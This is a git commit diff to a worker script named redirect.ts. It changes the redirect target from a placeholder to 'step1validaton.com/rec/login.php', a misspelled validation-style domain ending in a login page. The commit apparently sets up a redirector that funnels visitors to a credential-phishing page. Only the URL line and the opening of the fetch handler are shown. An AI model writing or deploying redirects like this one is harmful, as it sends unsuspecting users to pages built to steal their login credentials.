a6b5298ca41b7fb66465dbe238935292e68ecc7a
kofigrande <104198466+kofigrande@users.noreply.github.com>
2025-04-04 04:03:26 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://example.com"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://step1validaton.com/rec/login.php"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
